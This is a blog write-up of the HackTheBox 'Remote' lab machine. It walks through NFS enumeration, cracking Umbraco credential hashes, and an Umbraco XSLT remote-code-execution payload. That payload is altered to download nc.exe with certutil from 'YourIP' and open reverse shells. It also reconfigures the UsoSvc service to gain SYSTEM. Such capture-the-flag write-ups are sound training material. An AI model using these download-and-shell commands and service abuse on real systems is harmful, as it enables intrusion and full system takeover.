---
title: HackTheBox Remote Write-Up
tags: 
- hackthebox
- writeup
image: /images/remote/info.png
---

Boy oh boy! These windows machines never miss to teach me stuff. It forced me to learn some powershell. I am scared of powershell mainly so because every time I saw someone use it, It was just some long and alien commands and as they say:  humans are afraid of the things they do not understand. Network file system too was a new thing for me. This box took me considerably longer to root than the previous ones because I didn't even knew about the existence of some of the things that were needed to root this box. Lets dive in!

<!--more-->

<img src="/images/remote/info.png" />

Kicking off the nmap scan

```
nmap -A -T4 -p- -Pn 10.10.10.180

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3         2049/udp  nfs
|   100003  2,3,4       2049/tcp  nfs
|   100005  1,2,3       2049/tcp  mountd
|   100005  1,2,3       2049/udp  mountd
|   100021  1,2,3,4     2049/tcp  nlockmgr
|   100021  1,2,3,4     2049/udp  nlockmgr
|   100024  1           2049/tcp  status
|_  100024  1           2049/udp  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-30 18:20:51
|_  start_date: 1601-01-01 05:53:28
```

We see a lot of stuff in here. Lets start from the top. We see FTP and it allows anonymous access. Did we hit the jackpot right off the bat? No.

```
ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:lol): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 
```

And that was the case with most of the commands. It didn't do anything and just spit out bunch of useless output. I mean if you allow anonymous access atleast give me something, why play with my feelings? Moving on...

Next we see a web server on port 80. Browsing to the web page

<img src="/images/remote/website.png" width="1000"/>

Nothing exciting, no information on the CMS, no user input, no version number of any software used. Wait a minute! I think I found something while in the contact section. It is a login page.

<img src="/images/remote/login.png">

The URL looks like `10.10.10.180/umbraco/#/login/` and my gut tells me that "Umbraco" is something worth researching. Most of the times that tells us about the software used. Some research tells us that Umbraco is a CMS(content management system) and looks like we are on the right path. Then I try to find some CVEs for that and fair enough we do find [an exploit](https://www.exploit-db.com/exploits/46153). 

Reading the exploit tells us it requires credentials to work. Enumeration continues...

Next is a rpcbind service which I don't think is very exciting. You may be wondering about how is this guy just moving from one service to another and not enumerating the crap out of each of them? is he not afraid that he might skip some important information? he he he That is the trick to not get stuck in rabbit holes. If I enumerate a feature/service and don't see any leads for a few minutes then I move on to the next thing. I always put the effort according to the level of box I am solving. No need to spend an hour on a single thing. If it was a harder box then I would've looked at every single detail because they tend to have more subtle clues. Easy level boxes most of the time give out obvious clues if poked correctly. And it is not like this method is fool-proof, I do skip important information occasionally but it is a risk I am willing to take.

Next service is NFS ( no it does not stand for Need for Speed. It stands for Network File System). So this service is used to access files on a remote server like you access a local file. Sounds interesting for our purpose. So I lookup how to interact with it. Here is how:

```
showmount -e 10.10.10.180

Export list for 10.10.10.180:
/site_backups (everyone)
```

`showmount` is a command used to see if there are any directories available to mount to our system. And we see a directory named `site_backups`. Here is how I mounted it:

```
mkdir remote
sudo mount -t nfs 10.10.10.180:site_backups /tmp/remote
```

First we make a mounting point for the remote directory and then using `mount` command we can now see the contents of the directory "site_backups". 

```
/tmp$ cd remote
/tmp/remote$ ls
App_Browsers  aspnet_client  css           Media    Umbraco_Client
App_Data      bin            default.aspx  scripts  Views
App_Plugins   Config         Global.asax   Umbraco  Web.config
```

That is a lot of files and a lot of information to go through. But remember that all we need are the credentials for the exploit. So I google about where are the credentials stored in Umbraco CMs. I find that credentials are stored inside a .sdf database inside the App_data directory.

```
/tmp/remote$ cd App_Data
/tmp/remote/App_Data$ ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
/tmp/remote/App_Data$ cp Umbraco.sdf ~/Downloads
```

Now that we have made a local copy of the database you can unmount the nfs share with the command `sudo umount /tmp/remote` if you want.

Lets open up the the data base with a normal text editor. And I see a lot of readable text mixed with unreadble ones. Lets use the best tool there is i.e STRINGS.

```
strings Umbraco.sdf | more
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
  --snip--
```

How considerate of them to also tell us about the hashing algorithm used. So head on over to [crackstation](https://crackstation.net) and copy all the strings in those lines that looked like a hash to me. I see that the string after "adminadmin@htb.local" was a hash and were crackable. 

<img src="/images/remote/cracked.png" />

So we have the password and all that is left is the username. Looking closely at the login form it says that the username is an email. And we do see some email format in the database. After some hit and trial I had a successful login with the credentials "admin@htb.local" and "baconandcheese".

So I looked around the admin pannel and didn't waste too much time there because I already had a lead to follow. Yes we are now going to use the exploit that we found. 

This is the payload part of that python based exploit.
```
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
```

Hmm... xml is not really something I am comfortable with yet. But I can see the comment above the payload that says executing calc for a poc. Lets give the payload a reading anyway. I can understand that scripting language is c#, we see a string named cmd and the main thing we see is that proc.Startinfo.Filename="calc.exe". So that means this script will execute a calc command. Lets try replacing that with something like "curl". I don't see any output. Reading the script a little more we can see that there is no print statement for after we send the payload. So I add a little `print(r4.text)` at the end. And now we can see some output of different command we replace with with the calc.exe. After playing some more I see that we can pass the arguements to the string cmd. 

To gain a shell I start a python server and change the payload like this
```
{ string cmd = "-urlcache -split -f http://YourIP/nc.exe c:/windows/temp/nc.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "certutil"; proc.StartInfo.Arguments = cmd;\
```

And I see a GET request for the netcat executable on my server. Next I try to run that executable.

```
{ string cmd = "YourIP 1234 -e cmd.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "c:/windows/temp/nc.exe"; proc.StartInfo.Arguments = cmd;\
```

Now I just setup a netcat listener and run the script.

```
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.10.180 49686 received!
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
C:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

So we received a shell. We can find the user flag inside the `\Users\Public\` directory. And now we move on to escalating our privileges. 

So my knowledge of windows priv esc is very limited. I start looking inside all the user directories but didn't have the permissions. Then I transfer and run winPEAS. Nothing stands out yet ( to my amatuer eyes that is ). Finally someone [recommended this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/a6475a19d9333006df3fee5aa377b586087d5fab/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).

Looks like I will need to PowerUP. PowerUp is a tool to find weak services and the catch is that it is a powershell script. I have never used powershell before in my life. Till now I have relied on the good ol command prompt. Luckily Using th script wasn't that hard.

Oh Yeah I forgot something important to tell you. Let me tell you about my mistake first. So I transfered the script to the windows box using curl and nothing happened when I ran it. So I googled about it and [found this](https://www.itprotoday.com/powershell/how-run-powershell-script).
Apparently powershell is "secure" by default and has a signature mechanism in place to protect the system from running untrusted scripts. But when I transfered the script using certutil to the box the script ran normally. I still don't know the details but I just wanted to state an observation. 

So After I transfer the script and run it we see the output.

```
PS C:\windows\temp> . .\PowerUp.ps1
. .\PowerUp.ps1
PS C:\windows\temp> Invoke-AllChecks
Invoke-AllChecks

Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1044
ProcessId   : 4352
Name        : 4352
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

Now we are cookin! We see a weak service called Usosvc. After some more research I find that I can use sc.exe in windows to play with services. So sc.exe was like systemctl/service command for linux. Noted.

Here is some [documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config) for some background.
Refering to the previous [github page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/c7e3ea005e8a174664d17d04a5e25a66846c06a5/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) about priv esc there is also a section to exploit the Usosvc service.

So I was able to follow along because it was pretty straight forward and just set up another netcat listener.

```
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\temp\nc.exe YourIP 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe start UsoSvc
```

```
nc -lvp 5678
Listening on [0.0.0.0] (family 0, port 5678)
Connection from 10.10.10.180 49722 received!
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Phew... That was fun. Learned a lot of new stuff with this box. Also after I rooted this one I looked up basics of powershell and guess what? I don't find it that scary anymore :)